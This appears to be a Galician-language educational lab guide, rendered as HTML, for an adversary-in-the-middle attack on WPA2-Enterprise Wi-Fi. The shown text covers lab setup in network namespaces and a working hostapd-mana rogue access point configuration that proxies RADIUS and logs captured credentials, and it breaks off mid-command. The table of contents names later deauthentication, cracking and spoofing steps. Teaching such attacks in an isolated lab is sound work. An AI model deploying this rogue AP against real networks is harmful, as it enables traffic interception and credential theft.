+<a class="md-nav__link" href="../wifite-3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN/">
+<span class="md-ellipsis">
+    — wifite WPA3 SAE downgrade WPA2 PSK(EAP) EVIL TWIN  — NON SOPORTADO
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Táboa de contidos" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#1-contexto-e-topoloxia">
+<span class="md-ellipsis">
+      1. Contexto e Topoloxía
+    </span>
+</a>
+<nav aria-label="1. Contexto e Topoloxía" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#11-rol-de-interfaces-wi-fi">
+<span class="md-ellipsis">
+      1.1. Rol de Interfaces Wi-Fi
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#12-topoloxia-de-rede">
+<span class="md-ellipsis">
+      1.2. Topoloxía de Rede
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#2-preparacion-da-infraestrutura-consola-1-rede-corporativa">
+<span class="md-ellipsis">
+      2. Preparación da Infraestrutura (Consola 1 → Rede Corporativa)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#3-configuracion-do-mitm-ap-consola-3-mitm">
+<span class="md-ellipsis">
+      3. Configuración do MITM AP (Consola 3 → MITM)
+    </span>
+</a>
+<nav aria-label="3. Configuración do MITM AP (Consola 3 → MITM)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#31-entrar-no-namespace-mitm">
+<span class="md-ellipsis">
+      3.1. Entrar no Namespace MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#32-preparar-wlan2">
+<span class="md-ellipsis">
+      3.2. Preparar wlan2
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#33-crear-configuracion-de-hostapd-mana-pax-14-do-pdf">
+<span class="md-ellipsis">
+      3.3. Crear Configuración de hostapd-mana (Páx. 14 do PDF)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#34-executar-hostapd-mana-pax-15">
+<span class="md-ellipsis">
+      3.4. Executar hostapd-mana (Páx. 15)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#35-configurar-rede-e-dhcp-nova-terminal-consola-3b">
+<span class="md-ellipsis">
+      3.5. Configurar Rede e DHCP (Nova Terminal → Consola 3b)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#4-desautenticacion-e-forzado-consola-4-monitor">
+<span class="md-ellipsis">
+      4. Desautenticación e Forzado (Consola 4 → Monitor)
+    </span>
+</a>
+<nav aria-label="4. Desautenticación e Forzado (Consola 4 → Monitor)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#41-configurar-monitor-pax-16-do-pdf">
+<span class="md-ellipsis">
+      4.1. Configurar Monitor (Páx. 16 do PDF)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#42-escanear-ambos-aps">
+<span class="md-ellipsis">
+      4.2. Escanear Ambos APs
+    </span>
+</a>
+<nav aria-label="4.2. Escanear Ambos APs" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#421-escanear-soamente-o-ap-lexitimo">
+<span class="md-ellipsis">
+      4.2.1 Escanear soamente o AP lexítimo
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#43-configurar-canal-e-desautenticar-pax-16-17">
+<span class="md-ellipsis">
+      4.3. Configurar Canal e Desautenticar (Páx. 16-17)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#5-verificacion-de-conexion-ao-mitm-consola-2">
+<span class="md-ellipsis">
+      5. Verificación de Conexión ao MITM (Consola 2)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#6-captura-de-handshakes-wpa2-consola-3">
+<span class="md-ellipsis">
+      6. Captura de Handshakes WPA2 (Consola 3)
+    </span>
+</a>
+<nav aria-label="6. Captura de Handshakes WPA2 (Consola 3)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#61-visualizar-logs-pax-18-do-pdf">
+<span class="md-ellipsis">
+      6.1. Visualizar Logs (Páx. 18 do PDF)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#7-tentativa-de-crackear-handshake-wpa2-consola-5-analise">
+<span class="md-ellipsis">
+      7. Tentativa de Crackear Handshake WPA2 (Consola 5 → Análise)
+    </span>
+</a>
+<nav aria-label="7. Tentativa de Crackear Handshake WPA2 (Consola 5 → Análise)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#71-extraer-hash-wpa2-pax-18-19-do-pdf">
+<span class="md-ellipsis">
+      7.1. Extraer Hash WPA2 (Páx. 18-19 do PDF)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#72-tentar-crackear-con-hashcat-modo-22000">
+<span class="md-ellipsis">
+      7.2. Tentar Crackear con hashcat (Modo 22000)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#73-conclusion-critica-pax-19-do-pdf">
+<span class="md-ellipsis">
+      7.3. Conclusión Crítica (Páx. 19 do PDF)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#8-interceptacion-de-trafico-con-mitmproxy-consola-6-namespace-mitm_wlan2">
+<span class="md-ellipsis">
+      8. Interceptación de Tráfico con mitmproxy (Consola 6 → namespace mitm_wlan2)
+    </span>
+</a>
+<nav aria-label="8. Interceptación de Tráfico con mitmproxy (Consola 6 → namespace mitm_wlan2)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#81-entrar-no-namespace-mitm">
+<span class="md-ellipsis">
+      8.1. Entrar no Namespace MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#82-instalar-mitmproxy-se-non-esta">
+<span class="md-ellipsis">
+      8.2. Instalar mitmproxy (se non está)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#83-configurar-nat">
+<span class="md-ellipsis">
+      8.3. Configurar NAT
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#84-configurar-dns">
+<span class="md-ellipsis">
+      8.4. Configurar DNS
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#85-verificar-conectividade">
+<span class="md-ellipsis">
+      8.5. Verificar Conectividade
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#86-redirixir-portos-http-e-https-a-mitmproxy">
+<span class="md-ellipsis">
+      8.6. Redirixir Portos HTTP e HTTPS a mitmproxy
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#87-executar-mitmproxy">
+<span class="md-ellipsis">
+      8.7. Executar mitmproxy
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#9-punto-de-decision-continuar-ao-ataque-mitm-consolas-3-4-e-6">
+<span class="md-ellipsis">
+      9. PUNTO DE DECISIÓN: Continuar ao ataque MITM (Consolas 3, 4 e 6)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#91-despois-de-desautenticacion-renovar-ip-do-mitm">
+<span class="md-ellipsis">
+      9.1. DESPOIS de Desautenticación: Renovar IP do MITM
+    </span>
+</a>
+<nav aria-label="9.1. DESPOIS de Desautenticación: Renovar IP do MITM" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#911-verificar-migracion-ao-mitm">
+<span class="md-ellipsis">
+      9.1.1. Verificar Migración ao MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#912-renovar-ip-para-a-rede-do-mitm">
+<span class="md-ellipsis">
+      9.1.2. Renovar IP para a Rede do MITM
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#92-verificar-conectividade-co-mitm">
+<span class="md-ellipsis">
+      9.2 Verificar Conectividade co MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#93-xerar-trafico-http-agora-si-interceptado">
+<span class="md-ellipsis">
+      9.3 Xerar Tráfico HTTP (AGORA SI Interceptado)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#10-conclusion-e-tecnicas-de-ataque-post-autenticacion">
+<span class="md-ellipsis">
+      10. Conclusión e Técnicas de Ataque Post-Autenticación
+    </span>
+</a>
+<nav aria-label="10. Conclusión e Técnicas de Ataque Post-Autenticación" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#101-vantaxes-do-mitm-proxy-vs-evil-twin">
+<span class="md-ellipsis">
+      10.1. Vantaxes do MITM Proxy vs Evil Twin
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#102-limitacions-tecnicas">
+<span class="md-ellipsis">
+      10.2. Limitacións Técnicas
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#103-tecnicas-de-captura-de-credenciais">
+<span class="md-ellipsis">
+      10.3. Técnicas de Captura de Credenciais
+    </span>
+</a>
+<nav aria-label="10.3. Técnicas de Captura de Credenciais" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#a-interceptacion-http-con-mitmproxy-consola-6">
+<span class="md-ellipsis">
+      A) Interceptación HTTP con mitmproxy (Consola 6)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#b-dns-spoofing-consola-3b-namespace-mitm_wlan2">
+<span class="md-ellipsis">
+      B) DNS Spoofing (Consola 3b - namespace mitm_wlan2)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#c-arp-spoofing">
+<span class="md-ellipsis">
+      C) ARP Spoofing
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#104-limitacions-de-hsts-http-strict-transport-security">
+<span class="md-ellipsis">
+      10.4. Limitacións de HSTS (HTTP Strict Transport Security)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#105-obxectivo-acadado">
+<span class="md-ellipsis">
+      10.5. Obxectivo Acadado
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#11-limpeza">
+<span class="md-ellipsis">
+      11. Limpeza
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content" data-md-component="content">
+<article class="md-content__inner md-typeset">
+<h1 id="guia-de-practica-23-mitm-wi-fi-wpa2-eap-con-hostapd-mana">Guia de Práctica 2.3: MITM Wi-Fi WPA2 (EAP) con hostapd-mana</h1>
+<div class="admonition important">
+<p class="admonition-title">Baseada na práctica <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/2-Taller-HE-Practica-WiFi-3.pdf" target="_blank">2-Taller-HE-Practica-WiFi-3.pdf</a></p>
+</div>
+<h2 id="1-contexto-e-topoloxia">1. Contexto e Topoloxía</h2>
+<p>Nesta práctica realizaremos un ataque <strong>Adversary-in-the-Middle (AiTM)</strong> usando un AP Rogue configurado en modo <strong>Proxy RADIUS</strong>.</p>
+<div class="admonition important">
+<p class="admonition-title"><strong>Diferenza clave respecto ao Evil Twin (<a href="../2-ATAQUE_WPA2_EAP_EVIL_TWIN/" target='_blank"'>Práctica 2</a>)</strong></p>
+<ul>
+<li><strong>Evil Twin</strong>: <code>hostapd-wpe</code> con <code>eap_server=1</code> → captura hash MSCHAPv2 directamente  </li>
+<li><strong>MITM Proxy</strong>: <code>hostapd-mana</code> con <code>eap_server=0</code> → reenvía ao RADIUS real, captura <strong>handshakes WPA2</strong> (non crackeables) + <strong>tráfico post-autenticación</strong> </li>
+</ul>
+</div>
+<p><strong>Obxectivo:</strong><br/>
+- Interceptar TODO o tráfico da vítima mentres esta mantén acceso funcional á rede<br/>
+- Capturar credenciais mediante técnicas post-autenticación (SSL Stripping, DNS Spoofing)  </p>
+<h3 id="11-rol-de-interfaces-wi-fi">1.1. Rol de Interfaces Wi-Fi</h3>
+<p>Imos empregar:<br/>
+1. <strong>wlan0</strong> para AP lexítimo WPA2 (EAP) (shell bash consola1 → namespace <code>wifi_ap_wlan0</code>)<br/>
+2. <strong>wlan1</strong> para o cliente que se conecta ao AP (shell bash consola2 → namespace <code>wifi_cliente_wlan1</code>)<br/>
+3. <strong>wlan2</strong> e <strong>wlan3</strong> como interfaces do atacante que non coñece o contrasinal para conectarse ao AP:  </p>
+<ol>
+<li><strong>wlan2</strong> MITM (AP Rogue+Proxy) (shell bash consola3 → MITM → namespace <code>mitm_wlan2</code>)  </li>
+<li><strong>wlan3</strong> Monitor + Deseauth (shell bash consola4 → modo monitor + desautenticar cliente conectado wlan1 → namespace principal = SEN namespace)  </li>
+</ol>
+<h3 id="12-topoloxia-de-rede">1.2. Topoloxía de Rede</h3>
+<p><img alt="Fig. Topoloxía de rede" src="../images/diagrama_topoloxia_mitm_mermaid.svg"/></p>
+<hr/>
+<h2 id="2-preparacion-da-infraestrutura-consola-1-rede-corporativa">2. Preparación da Infraestrutura (Consola 1 → Rede Corporativa)</h2>
+<p>O laboratorio configura automaticamente:<br/>
+- Bridge <code>br-radius</code> (192.168.50.1/24)<br/>
+- FreeRADIUS escoitando en 192.168.50.1:1812<br/>
+- <strong>AP lexítimo <code>wlan0</code> (Canal 6)</strong> conectado ao bridge<br/>
+  - Rede corporativa: 192.168.50.0/24<br/>
+  - DHCP: 192.168.50.50 - 192.168.50.100<br/>
+  - Gateway: 192.168.50.1<br/>
+- Cliente vulnerable <code>wlan1</code> </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>up<span class="w"> </span>eap_mitm
+</span><span id="__span-0-2"><a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>status
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a>NAMESPACE                 INTERFACE       IP                   ESTADO
+</span><span id="__span-1-2"><a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a>---------------------------------------------------------------------------
+</span><span id="__span-1-3"><a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a>wifi_cliente_wlan1        wlan1           192.168.50.XY/24     UP
+</span><span id="__span-1-4"><a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a>mitm_wlan2                wlan2           -                    UP
+</span><span id="__span-1-5"><a href="#__codelineno-1-5" id="__codelineno-1-5" name="__codelineno-1-5"></a>mitm_wlan2                veth0@if12      -                    UP
+</span><span id="__span-1-6"><a href="#__codelineno-1-6" id="__codelineno-1-6" name="__codelineno-1-6"></a>wifi_ap_wlan0             br0             192.168.50.10/24     UP
+</span><span id="__span-1-7"><a href="#__codelineno-1-7" id="__codelineno-1-7" name="__codelineno-1-7"></a>wifi_ap_wlan0             wlan0           -                    UP
+</span><span id="__span-1-8"><a href="#__codelineno-1-8" id="__codelineno-1-8" name="__codelineno-1-8"></a>wifi_ap_wlan0             veth0@if10      -                    UP
+</span><span id="__span-1-9"><a href="#__codelineno-1-9" id="__codelineno-1-9" name="__codelineno-1-9"></a>---------------------------------------------------------------------------
+</span><span id="__span-1-10"><a href="#__codelineno-1-10" id="__codelineno-1-10" name="__codelineno-1-10"></a>Interfaces GLOBAIS / ATACANTE:
+</span><span id="__span-1-11"><a href="#__codelineno-1-11" id="__codelineno-1-11" name="__codelineno-1-11"></a>(global)                  wlan3           (host/monitor)       LISTO
+</span></code></pre></div></p>
+<p><strong>Verificar RADIUS operativo (Páx. 8 do PDF):</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a>sudo<span class="w"> </span>netstat<span class="w"> </span>-ulnp<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">1812</span>
+</span><span id="__span-2-2"><a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="c1"># Debe amosar: 192.168.50.1:1812</span>
+</span></code></pre></div></p>
+<p><strong>Verificar que o cliente lexítimo ten Internet:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>wifi_cliente_wlan1<span class="w"> </span>bash
+</span><span id="__span-3-2"><a href="#__codelineno-3-2" id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="c1"># Debería ter IP 192.168.50.XX asignada por DHCP</span>
+</span><span id="__span-3-3"><a href="#__codelineno-3-3" id="__codelineno-3-3" name="__codelineno-3-3"></a>ip<span class="w"> </span>addr<span class="w"> </span>show<span class="w"> </span>wlan1
+</span><span id="__span-3-4"><a href="#__codelineno-3-4" id="__codelineno-3-4" name="__codelineno-3-4"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">192</span>.168.50.1<span class="w">  </span><span class="c1"># Gateway corporativo</span>
+</span><span id="__span-3-5"><a href="#__codelineno-3-5" id="__codelineno-3-5" name="__codelineno-3-5"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">8</span>.8.8.8<span class="w">       </span><span class="c1"># Internet</span>
+</span><span id="__span-3-6"><a href="#__codelineno-3-6" id="__codelineno-3-6" name="__codelineno-3-6"></a>curl<span class="w"> </span>http://www.example.com<span class="w">  </span><span class="c1"># Web</span>
+</span><span id="__span-3-7"><a href="#__codelineno-3-7" id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="c1"># Debe funcionar ✓</span>
+</span></code></pre></div></p>
+<hr/>
+<h2 id="3-configuracion-do-mitm-ap-consola-3-mitm">3. Configuración do MITM AP (Consola 3 → MITM)</h2>
+<p>Seguindo a <strong>Páxina 13-15</strong> do PDF, configuramos <code>hostapd-mana</code> en modo <strong>proxy RADIUS</strong>.</p>
+<h3 id="31-entrar-no-namespace-mitm">3.1. Entrar no Namespace MITM</h3>
+<p>O <code>wifilabctl</code> xa preparou o namespace <code>mitm_wlan2</code> con:<br/>
+- Interface <code>veth0</code> conectada ao bridge <code>br-radius</code> con IP 192.168.50.100/24<br/>
+- Ruta por defecto cara a 192.168.50.1 (RADIUS)  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c1"># Entrar no namespace MITM</span>
+</span><span id="__span-4-2"><a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>mitm_wlan2<span class="w"> </span>bash
+</span><span id="__span-4-3"><a href="#__codelineno-4-3" id="__codelineno-4-3" name="__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a href="#__codelineno-4-4" id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="c1"># Verificar conectividade co RADIUS (Páx. 13 do PDF)</span>
+</span><span id="__span-4-5"><a href="#__codelineno-4-5" id="__codelineno-4-5" name="__codelineno-4-5"></a>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="m">192</span>.168.50.1
+</span><span id="__span-4-6"><a href="#__codelineno-4-6" id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="c1"># Debe responder. Se non, comproba: ip route show e ip addr show veth0</span>
+</span></code></pre></div>
+<h3 id="32-preparar-wlan2">3.2. Preparar wlan2</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a href="#__codelineno-5-1" id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c1"># Levantar a interface wireless</span>
+</span><span id="__span-5-2"><a href="#__codelineno-5-2" id="__codelineno-5-2" name="__codelineno-5-2"></a>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>wlan2<span class="w"> </span>up
+</span></code></pre></div>
+<h3 id="33-crear-configuracion-de-hostapd-mana-pax-14-do-pdf">3.3. Crear Configuración de hostapd-mana (Páx. 14 do PDF)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a href="#__codelineno-6-1" id="__codelineno-6-1" name="__codelineno-6-1"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/mana.conf<span class="w"> </span><span class="s">&lt;&lt;EOF</span>
+</span><span id="__span-6-2"><a href="#__codelineno-6-2" id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="s">interface=wlan2</span>
+</span><span id="__span-6-3"><a href="#__codelineno-6-3" id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="s">driver=nl80211</span>
+</span><span id="__span-6-4"><a href="#__codelineno-6-4" id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="s">ssid=EMPRESA-XYZ</span>
+</span><span id="__span-6-5"><a href="#__codelineno-6-5" id="__codelineno-6-5" name="__codelineno-6-5"></a><span class="s">channel=1</span>
+</span><span id="__span-6-6"><a href="#__codelineno-6-6" id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="s">hw_mode=g</span>
+</span><span id="__span-6-7"><a href="#__codelineno-6-7" id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="s">wpa=2</span>
+</span><span id="__span-6-8"><a href="#__codelineno-6-8" id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="s">wpa_key_mgmt=WPA-EAP</span>
+</span><span id="__span-6-9"><a href="#__codelineno-6-9" id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="s">wpa_pairwise=CCMP</span>
+</span><span id="__span-6-10"><a href="#__codelineno-6-10" id="__codelineno-6-10" name="__codelineno-6-10"></a><span class="s">rsn_pairwise=CCMP</span>
+</span><span id="__span-6-11"><a href="#__codelineno-6-11" id="__codelineno-6-11" name="__codelineno-6-11"></a><span class="s">ieee8021x=1</span>
+</span><span id="__span-6-12"><a href="#__codelineno-6-12" id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="s"># CRÍTICO: Proxy RADIUS ao servidor corporativo (192.168.50.1)</span>
+</span><span id="__span-6-13"><a href="#__codelineno-6-13" id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="s">auth_server_addr=192.168.50.1</span>
+</span><span id="__span-6-14"><a href="#__codelineno-6-14" id="__codelineno-6-14" name="__codelineno-6-14"></a><span class="s">auth_server_port=1812</span>
+</span><span id="__span-6-15"><a href="#__codelineno-6-15" id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="s">auth_server_shared_secret=testing123</span>
+</span><span id="__span-6-16"><a href="#__codelineno-6-16" id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="s"># Modo MANA: interceptación + proxy transparente</span>
+</span><span id="__span-6-17"><a href="#__codelineno-6-17" id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="s">mana_wpe=1</span>
+</span><span id="__span-6-18"><a href="#__codelineno-6-18" id="__codelineno-6-18" name="__codelineno-6-18"></a><span class="s">mana_eapsuccess=1</span>
+</span><span id="__span-6-19"><a href="#__codelineno-6-19" id="__codelineno-6-19" name="__codelineno-6-19"></a><span class="s">mana_credout=/tmp/mana-credentials.log</span>
+</span><span id="__span-6-20"><a href="#__codelineno-6-20" id="__codelineno-6-20" name="__codelineno-6-20"></a><span class="s"># IMPORTANTE: eap_server=0 significa modo PROXY (non servidor EAP local)  </span>
+</span><span id="__span-6-21"><a href="#__codelineno-6-21" id="__codelineno-6-21" name="__codelineno-6-21"></a><span class="s">eap_server=0</span>
+</span><span id="__span-6-22"><a href="#__codelineno-6-22" id="__codelineno-6-22" name="__codelineno-6-22"></a><span class="s"># Logging avanzado</span>
+</span><span id="__span-6-23"><a href="#__codelineno-6-23" id="__codelineno-6-23" name="__codelineno-6-23"></a><span class="s">logger_syslog=-1</span>
+</span><span id="__span-6-24"><a href="#__codelineno-6-24" id="__codelineno-6-24" name="__codelineno-6-24"></a><span class="s">logger_stdout=-1</span>
+</span><span id="__span-6-25"><a href="#__codelineno-6-25" id="__codelineno-6-25" name="__codelineno-6-25"></a><span class="s">logger_stdout_level=2</span>
+</span><span id="__span-6-26"><a href="#__codelineno-6-26" id="__codelineno-6-26" name="__codelineno-6-26"></a><span class="s">EOF</span>
+</span></code></pre></div>
+<h3 id="34-executar-hostapd-mana-pax-15">3.4. Executar hostapd-mana (Páx. 15)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a href="#__codelineno-7-1" id="__codelineno-7-1" name="__codelineno-7-1"></a>/opt/hostapd-mana/hostapd/hostapd<span class="w"> </span>/tmp/mana.conf<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>/tmp/mana-ap.log
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a href="#__codelineno-8-1" id="__codelineno-8-1" name="__codelineno-8-1"></a>Configuration file: /tmp/mana.conf
+</span><span id="__span-8-2"><a href="#__codelineno-8-2" id="__codelineno-8-2" name="__codelineno-8-2"></a>MANA: Captured credentials will be written to file '/tmp/mana-credentials.log'.
+</span><span id="__span-8-3"><a href="#__codelineno-8-3" id="__codelineno-8-3" name="__codelineno-8-3"></a>Using interface wlan2 with hwaddr aa:bb:cc:dd:ee:ff and ssid "EMPRESA-XYZ"
+</span><span id="__span-8-4"><a href="#__codelineno-8-4" id="__codelineno-8-4" name="__codelineno-8-4"></a>wlan2: RADIUS Authentication server 192.168.50.1:1812
+</span><span id="__span-8-5"><a href="#__codelineno-8-5" id="__codelineno-8-5" name="__codelineno-8-5"></a>wlan2: interface state UNINITIALIZED-&gt;ENABLED
+</span><span id="__span-8-6"><a href="#__codelineno-8-6" id="__codelineno-8-6" name="__codelineno-8-6"></a>wlan2: AP-ENABLED
+</span></code></pre></div></p>
+<p><strong>Deixa <code>hostapd-mana</code> executándose</strong> e abre unha <strong>nova terminal</strong> para continuar.</p>
+<hr/>
+<h3 id="35-configurar-rede-e-dhcp-nova-terminal-consola-3b">3.5. Configurar Rede e DHCP (Nova Terminal → Consola 3b)</h3>
+<p><strong>IMPORTANTE:</strong> Sen <a href="https://ricardofc.github.io/repoEDU-CCbySA/#sr" target="_blank">DHCP</a>, o cliente tería que configurar a IP manualmente (obviamente sospeitoso). Con <a href="https://github.com/ricardofc/repoEDU-CCbySA/blob/main/SI/Servizos/Practica-SI-DNS-DHCP-dnsmasq.pdf" target="_blank">DHCP</a>, o ataque é <strong>totalmente transparente</strong>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a href="#__codelineno-9-1" id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="c1"># Entrar de novo no namespace MITM</span>
+</span><span id="__span-9-2"><a href="#__codelineno-9-2" id="__codelineno-9-2" name="__codelineno-9-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>mitm_wlan2<span class="w"> </span>bash
+</span><span id="__span-9-3"><a href="#__codelineno-9-3" id="__codelineno-9-3" name="__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a href="#__codelineno-9-4" id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="c1"># Asignar IP a wlan2 (hostapd elimínaa ao arrancar)</span>
+</span><span id="__span-9-5"><a href="#__codelineno-9-5" id="__codelineno-9-5" name="__codelineno-9-5"></a>ip<span class="w"> </span>addr<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.0.0.1/24<span class="w"> </span>dev<span class="w"> </span>wlan2
+</span><span id="__span-9-6"><a href="#__codelineno-9-6" id="__codelineno-9-6" name="__codelineno-9-6"></a>
